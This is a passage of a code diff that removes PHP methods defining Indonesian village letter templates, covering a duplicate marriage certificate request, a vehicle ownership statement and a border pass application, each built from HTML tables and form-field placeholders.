-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratPermohonanDuplikatNikah($hasil, $id)
-    {
-        $nama_surat = 'Permohonan Duplikat Surat Nikah';
-
-        $data = [
-            'nama'                => $nama_surat,
-            'kode_surat'          => 'S-33',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_kecamatan_kua]","nama":"Kecamatan KUA","deskripsi":"Isi Kecamatan KUA","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"date","kode":"[form_tanggal_nikah]","nama":"Tanggal Nikah","deskripsi":"Isi Tanggal Nikah","atribut":null,"pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nama_pasangan]","nama":"Nama Pasangan","deskripsi":"Isi Nama Pasangan","atribut":null,"pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'template'            => "<h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>\r\n<p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan dengan sebenarnya bahwa :</p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 251.4px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">\r\n<tbody>\r\n<tr style=\"height: 19.7625px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.7625px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; height: 19.7625px; text-align: left;\">1.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.7625px;\">Nama Lengkap</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.7625px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.7625px; text-align: justify;\"><strong>[NAma]</strong></td>\r\n</tr>\r\n<tr style=\"height: 19.7625px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.7625px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; height: 19.7625px; text-align: left;\">2.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.7625px;\">NIK / No. KTP</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.7625px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.7625px; text-align: justify;\">[Nik]</td>\r\n</tr>\r\n<tr style=\"height: 25.8125px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 25.8125px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; text-align: left; height: 25.8125px;\">3.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 25.8125px;\">Nomor KK</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 25.8125px;\">:</td>\r\n<td style=\"width: 60.0524%; text-align: justify; height: 25.8125px;\">[No_kK]</td>\r\n</tr>\r\n<tr style=\"height: 21.8125px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 21.8125px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; text-align: left; height: 21.8125px;\">4.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 21.8125px;\">Kepala Keluarga</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 21.8125px;\">:</td>\r\n<td style=\"width: 60.0524%; text-align: justify; height: 21.8125px;\">[Kepala_kK]</td>\r\n</tr>\r\n<tr style=\"height: 19.7625px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.7625px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; height: 19.7625px; text-align: left;\">5.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.7625px;\">Jenis Kelamin</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.7625px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.7625px; text-align: justify;\">[Jenis_kelamin]</td>\r\n</tr>\r\n<tr style=\"height: 19.7625px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.7625px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; height: 19.7625px; text-align: left;\">6.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.7625px;\">Tempat / Tanggal Lahir</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.7625px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.7625px; text-align: justify;\">[TtL]</td>\r\n</tr>\r\n<tr style=\"height: 43.4875px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 43.4875px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; text-align: left; height: 43.4875px;\">7.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 43.4875px;\">Alamat / Tempat Tinggal</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 43.4875px;\">:</td>\r\n<td style=\"width: 60.0524%; text-align: justify; height: 43.4875px;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>\r\n</tr>\r\n<tr style=\"height: 21.825px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 21.825px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; text-align: left; height: 21.825px;\">8.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 21.825px;\">Agama</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 21.825px;\">:</td>\r\n<td style=\"width: 60.0524%; text-align: justify; height: 21.825px;\">[AgAma]</td>\r\n</tr>\r\n<tr style=\"height: 19.7625px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.7625px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; height: 19.7625px; text-align: left;\">9.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.7625px;\">Pekerjaan</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.7625px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.7625px; text-align: justify;\">[PeKerjaan]</td>\r\n</tr>\r\n<tr style=\"height: 19.7625px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.7625px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; height: 19.7625px; text-align: left;\">10.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.7625px;\">Pendidikan</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.7625px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.7625px; text-align: justify;\">[Pendidikan_kk]</td>\r\n</tr>\r\n<tr style=\"height: 19.8875px;\">\r\n<td style=\"width: 4.3222%; text-align: center; height: 19.8875px;\">\u{a0}</td>\r\n<td style=\"width: 3.92927%; height: 19.8875px; text-align: left;\">11.</td>\r\n<td style=\"width: 30.5174%; text-align: left; height: 19.8875px;\">Kewarganegaraan</td>\r\n<td style=\"width: 1.24427%; text-align: center; height: 19.8875px;\">:</td>\r\n<td style=\"width: 60.0524%; height: 19.8875px; text-align: justify;\">[Warga_negarA]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Yang namanya tersebut di atas memang benar warga kami dan telah menikah di KUA [Form_kecamatan_kuA] pada [Form_tanggal_nikaH] dengan seseorang yang bernama [Form_nama_pasangaN]. Berdasarkan data di atas mohon untuk dibuatkan Duplikat Surat Nikah orang tersebut di atas.</p>\r\n<p style=\"text-align: justify; text-indent: 30px;\">Demikian surat keterangan ini dibuat dengan sebenarnya, untuk dipergunakan sebagaimana mestinya.<br /><br /></p>\r\n<table style=\"border-collapse: collapse; width: 100%; height: 144px;\" border=\"0\">\r\n<tbody>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 30%; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[NaMa_desa], [TgL_surat]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 30%; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[Atas_namA]</td>\r\n</tr>\r\n<tr style=\"height: 72px;\">\r\n<td style=\"width: 35%; text-align: center; height: 72px;\">\u{a0}</td>\r\n<td style=\"width: 30%; height: 72px;\"><br /><br /><br /><br /></td>\r\n<td style=\"width: 35%; height: 72px;\">\u{a0}</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 30%; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[Nama_pamonG]</td>\r\n</tr>\r\n<tr style=\"height: 18px;\">\r\n<td style=\"width: 35%; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 30%; height: 18px;\">\u{a0}</td>\r\n<td style=\"width: 35%; text-align: center; height: 18px;\">[SEbutan_nip_desa] : [nip_pamong]</td>\r\n</tr>\r\n</tbody>\r\n</table>\r\n<div style=\"text-align: center;\"><br />[qr_code]</div>",
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratKepemilikanKendaraan($hasil, $id)
-    {
-        $nama_surat = 'Keterangan Kepemilikan Kendaraan';
-
-        $data = [
-            'nama'                => $nama_surat,
-            'kode_surat'          => 'S-48',
-            'masa_berlaku'        => 1,
-            'satuan_masa_berlaku' => 'M',
-            'orientasi'           => 'Potrait',
-            'ukuran'              => 'F4',
-            'margin'              => '{"kiri":1.78,"atas":0.63,"kanan":1.78,"bawah":1.37}',
-            'qr_code'             => StatusEnum::TIDAK,
-            'kode_isian'          => '[{"tipe":"text","kode":"[form_merktype]","nama":"Merk\/Type","deskripsi":"Merk\/Type Kendaraan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"number","kode":"[form_tahun_pembuatan]","nama":"Tahun Pembuatan","deskripsi":"Tahun Pembuatan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_warna_kendaraan]","nama":"Warna Kendaraan","deskripsi":"Warna Kendaraan","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nomor_polisi]","nama":"Nomor Polisi","deskripsi":"Nomor Polisi","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nomor_mesin]","nama":"Nomor Mesin","deskripsi":"Nomor Mesin","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nomor_rangka]","nama":"Nomor Rangka","deskripsi":"Nomor Rangka","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_nomor_bpkb]","nama":"Nomor BPKB","deskripsi":"Nomor BPKB","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_bahan_bakar]","nama":"Bahan Bakar","deskripsi":"Bahan Bakar","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_isi_silinder]","nama":"Isi Silinder","deskripsi":"Isi Silinder","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"text","kode":"[form_atas_nama]","nama":"Atas Nama","deskripsi":"Atas Nama","atribut":"class=\"required\"","pilihan":null,"refrensi":null},{"tipe":"textarea","kode":"[form_keperluan_pembuatan_surat]","nama":"Keperluan Pembuatan Surat","deskripsi":"Untuk Keperluan","atribut":"class=\"required\"","pilihan":null,"refrensi":null}]',
-            'form_isian'          => '{"data":"1","individu":{"sex":"","status_dasar":"","kk_level":""}}',
-            'mandiri'             => StatusEnum::TIDAK,
-            'syarat_surat'        => null,
-            'template'            => "<h4 style=\"margin: 0; text-align: center;\"><span style=\"text-decoration: underline;\">[JUdul_surat]</span></h4>
-            <p style=\"margin: 0; text-align: center;\">Nomor : [Format_nomor_suraT]<br /><br /></p>
-            <p style=\"text-align: justify; text-indent: 30px;\">Yang bertanda tangan di bawah ini [JaBatan] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten], Provinsi [NaMa_provinsi] menerangkan bahwa berdasarkan keterangan dari :</p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 118px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">
-            <tbody>
-            <tr style=\"height: 10px;\">
-            <td style=\"width: 4.5221%; text-align: center; height: 10px;\">\u{a0}</td>
-            <td style=\"width: 31.7575%; text-align: left; height: 10px;\">Nama Lengkap</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 10px;\">:</td>
-            <td style=\"width: 62.4872%; height: 10px; text-align: justify;\"><strong>[NAma]</strong></td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.5221%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7575%; text-align: left; height: 18px;\">Tempat / Tanggal Lahir</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.4872%; height: 18px; text-align: justify;\">[TtL]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.5221%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7575%; text-align: left; height: 18px;\">Umur</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.4872%; text-align: justify; height: 18px;\">[UsIa]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.5221%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7575%; text-align: left; height: 18px;\">Jenis Kelamin</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.4872%; height: 18px; text-align: justify;\">[Jenis_kelamin]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.5221%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7575%; text-align: left; height: 18px;\">Pekerjaan</td>
-            <td style=\"width: 1.2333%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.4872%; text-align: justify; height: 18px;\">[PeKerjaan]</td>
-            </tr>
-            <tr style=\"height: 36px;\">
-            <td style=\"width: 4.5221%; text-align: center; height: 36px;\">\u{a0}</td>
-            <td style=\"width: 31.7575%; text-align: left; height: 36px;\">Alamat / Tempat Tinggal<br /><br /></td>
-            <td style=\"width: 1.2333%; text-align: center; height: 36px;\">:<br /><br /></td>
-            <td style=\"width: 62.4872%; height: 36px; text-align: justify;\">[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style=\"text-align: justify; text-indent: 30px;\">Orang tersebut adalah penduduk [Sebutan_desa] [NaMa_desa], yang mempunyai kendaraan dengan rincian sebagai berikut, sesuai BPKB :<strong><br /></strong></p>
-            <table style=\"border-collapse: collapse; width: 100%; height: 180px;\" border=\"0\" cellspacing=\"0\" cellpadding=\"0\">
-            <tbody>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Merk / Type</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_merktypE]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Tahun Pembuatan</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_tahun_pembuataN]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Warna</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_warna_kendaraaN]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Nomor Polisi</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_nomor_polisI]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Nomor Mesin</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_nomor_mesiN]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Nomor Rangka</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_nomor_rangkA]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Nomor BPKB</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_nomor_bpkB]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; text-align: center; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Bahan Bakar</td>
-            <td style=\"width: 1.20846%; text-align: center; height: 18px;\">:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_bahan_bakaR]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Isi Silinder</td>
-            <td style=\"width: 1.20846%; height: 18px;\">\u{a0}:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_isi_silindeR]</td>
-            </tr>
-            <tr style=\"height: 18px;\">
-            <td style=\"width: 4.53172%; height: 18px;\">\u{a0}</td>
-            <td style=\"width: 31.7221%; height: 18px;\">Atas Nama</td>
-            <td style=\"width: 1.20846%; height: 18px;\">\u{a0}:</td>
-            <td style=\"width: 62.5378%; height: 18px;\">[Form_atas_namA]</td>
-            </tr>
-            </tbody>
-            </table>
-            <p style=\"text-align: justify; text-indent: 30px;\">Kendaraan tersebut di atas adalah milik <strong>[NAma]</strong> yang beralamat di <strong>[AlamaT] [Sebutan_desa] [NaMa_desa], Kecamatan [NaMa_kecamatan], [SeButan_kabupaten] [NaMa_kabupaten].</strong> Surat keterangan ini dipergunakan untuk : <strong>[Form_keperluan_pembuatan_suraT]</strong>.</p>
-            <p style=\"text-align: justify; text-indent: 30px;\">Demikian surat keterangan ini dibuat dengan sebenarnya, untuk dipergunakan sebagaimana mestinya.</p>
-            <p style=\"text-align: justify; text-indent: 30px;\">\u{a0}</p>
-            <table style=\"border-collapse: collapse; width: 100%;\" border=\"0\">
-            <tbody>
-            <tr>
-            <td style=\"width: 35%; text-align: center;\">\u{a0}</td>
-            <td style=\"width: 30%;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center;\">[NaMa_desa], [TgL_surat]</td>
-            </tr>
-            <tr>
-            <td style=\"width: 35%; text-align: center;\">Pemilik</td>
-            <td style=\"width: 30%;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center;\">[Atas_namA]</td>
-            </tr>
-            <tr>
-            <td style=\"width: 35%; text-align: center;\">\u{a0}</td>
-            <td style=\"width: 30%;\"><br /><br /><br /><br /></td>
-            <td style=\"width: 35%;\">\u{a0}</td>
-            </tr>
-            <tr>
-            <td style=\"width: 35%; text-align: center;\">[NamA]</td>
-            <td style=\"width: 30%;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center;\">[Nama_pamonG]</td>
-            </tr>
-            <tr>
-            <td style=\"width: 35%;\">\u{a0}</td>
-            <td style=\"width: 30%;\">\u{a0}</td>
-            <td style=\"width: 35%; text-align: center;\">[SEbutan_nip_desa] : [nip_pamong]</td>
-            </tr>
-            </tbody>
-            </table>
-            <div style=\"text-align: center;\">\u{a0}</div>",
-        ];
-
-        return $hasil && $this->tambah_surat_tinymce($data, $id);
-    }
-
-    protected function suratPenerbitanBukuPas($hasil, $id)
-    {
-        $nama_surat = 'Pengantar Permohonan Penerbitan Buku Pas Lintas';
-        $template   = <<<HTML
-            <h4 style="margin: 0; text-align: center;"><span style="text-decoration: underline;">[JUdul_surat]</span></h4>
-            <p style="margin: 0; text-align: center;">Nomor : [Kode_suraT]/[Nomer_suraT]/437.103.09/[TahuN]<br /><br /></p>
-            <p style="text-align: justify; text-indent: 30px;">Yang bertanda tangan di bawah ini menerangkan bahwa:</p>
-            <table style="border-collapse: collapse; width: 100%; height: 289.336px;" border="0" cellspacing="0" cellpadding="0">
-            <tbody>
-            <tr style="height: 19.7461px;">
-            <td style="width: 4.31044%; text-align: center; height: 19.7461px;">\u{a0}</td>
-            <td style="width: 3.91132%; height: 19.7461px; text-align: left;">1.</td>
-            <td style="width: 30.4923%; text-align: left; height: 19.7461px;">Nomor Induk Kependudukan (NIK)</td>
-            <td style="width: 1.27717%; text-align: center; height: 19.7461px;">:</td>
-            <td style="width: 60.0268%; height: 19.7461px; text-align: justify;">[Nik]</td>
-            </tr>
-            <tr style="height: 19.7461px;">
-            <td style="width: 4.31044%; text-align: center; height: 19.7461px;">\u{a0}</td>
-            <td style="width: 3.91132%; height: 19.7461px; text-align: left;">2.</td>
-            <td style="width: 30.4923%; text-align: left; height: 19.7461px;">Nama Lengkap Pemohon</td>
-            <td style="width: 1.27717%; text-align: center; height: 19.7461px;">:</td>
-            <td style="width: 60.0268%; height: 19.7461px; text-align: justify;">[NAma]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">3.</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">Jenis Kelamin</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">[Jenis_kelamiN]</td>
-            </tr>
-            <tr style="height: 19.7461px;">
-            <td style="width: 4.31044%; text-align: center; height: 19.7461px;">\u{a0}</td>
-            <td style="width: 3.91132%; height: 19.7461px; text-align: left;">4.</td>
-            <td style="width: 30.4923%; text-align: left; height: 19.7461px;">Tempat</td>
-            <td style="width: 1.27717%; text-align: center; height: 19.7461px;">:</td>
-            <td style="width: 60.0268%; height: 19.7461px; text-align: justify;">[TempatlahiR]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">5.</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">Tanggal Lahir</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">[TanggallahiR]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">6.</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">Alamat</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">[AlamaT]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">\u{a0}</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">a.</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">[Sebutan_desA] [Nama_desA] : [Kode_desA]</td>
-            </tr>
-            <tr style="height: 20.7422px;">
-            <td style="width: 4.31044%; text-align: center; height: 20.7422px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 20.7422px;">\u{a0} \u{a0} \u{a0}</td>
-            <td style="width: 30.4923%; text-align: left; height: 20.7422px;">b.</td>
-            <td style="width: 1.27717%; text-align: center; height: 20.7422px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 20.7422px;">[Sebutan_kecamataN] [Nama_kecamataN] : [Kode_kecamataN]</td>
-            </tr>
-            <tr style="height: 19.7461px;">
-            <td style="width: 4.31044%; text-align: center; height: 19.7461px;">\u{a0}</td>
-            <td style="width: 3.91132%; height: 19.7461px; text-align: left;">7.</td>
-            <td style="width: 30.4923%; text-align: left; height: 19.7461px;">Pekerjaan</td>
-            <td style="width: 1.27717%; text-align: center; height: 19.7461px;">:</td>
-            <td style="width: 60.0268%; height: 19.7461px; text-align: justify;">[PeKerjaan]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">8.</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">Status Perkawinan</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">[Status_kawiN]</td>
-            </tr>
-            <tr style="height: 19.8633px;">
-            <td style="width: 4.31044%; text-align: center; height: 19.8633px;">\u{a0}</td>
-            <td style="width: 3.91132%; height: 19.8633px; text-align: left;">9.</td>
-            <td style="width: 30.4923%; text-align: left; height: 19.8633px;">Kewarganegaraan</td>
-            <td style="width: 1.27717%; text-align: center; height: 19.8633px;">:</td>
-            <td style="width: 60.0268%; height: 19.8633px; text-align: justify;">[Warga_negarA]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">10.</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">Agama</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">[AgAma]</td>
-            </tr>
-            <tr style="height: 19.7461px;">
-            <td style="width: 4.31044%; text-align: center; height: 19.7461px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 19.7461px;">11.</td>
-            <td style="width: 30.4923%; text-align: left; height: 19.7461px;">Nomor Kartu Keluarga</td>
-            <td style="width: 1.27717%; text-align: center; height: 19.7461px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 19.7461px;">[No_kK]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">12.</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">Nama Kepala Keluarga</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">[Kepala_kK]</td>
-            </tr>
-            <tr style="height: 18.75px;">
-            <td style="width: 4.31044%; text-align: center; height: 18.75px;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left; height: 18.75px;">13.</td>
-            <td style="width: 30.4923%; text-align: left; height: 18.75px;">Pengikut / Anggota Keluarga **)</td>
-            <td style="width: 1.27717%; text-align: center; height: 18.75px;">:</td>
-            <td style="width: 60.0268%; text-align: justify; height: 18.75px;">\u{a0}</td>
-            </tr>
-            <tr>
-            <td style="width: 4.31044%; text-align: center;">\u{a0}</td>
-            <td style="width: 3.91132%; text-align: left;">\u{a0}</td>
-            <td style="text-align: left; width: 91.7963%;" colspan="3">[Pengikut_suraT]</td>
-            </tr>
-            </tbody>
-            </table>
-            <br />
-            <p style="text-align: justify; text-indent: 30px;">Surat permohonan ini dipergunakan untuk pengurusan penerbitan Buku Pas Lintas Batas.<br /><br /></p>
-            <table style="border-collapse: collapse; width: 100%; height: 144px;" border="0">
-            <tbody>
-            <tr style="height: 18px;">
-            <td style="width: 35%; text-align: center; height: 18px;">\u{a0}</td>
-            <td style="width: 30%; height: 18px;">\u{a0}</td>
-            <td style="width: 35%; text-align: center; height: 18px;">[NaMa_desa], [TgL_surat]</td>
-            </tr>
-            <tr style="height: 18px;">
-            <td style="width: 35%; text-align: center; height: 18px;">Mengetahui :\u{a0}</td>
-            <td style="width: 30%; height: 18px;">\u{a0}</td>
-            <td style="width: 35%; text-align: center; height: 18px;">[Atas_namA]</td>
-            </tr>
-            <tr>
-            <td style="width: 35%; text-align: center;">[Sebutan_camaT] [Nama_kecamataN]</td>
-            <td style="width: 30%;">\u{a0}</td>
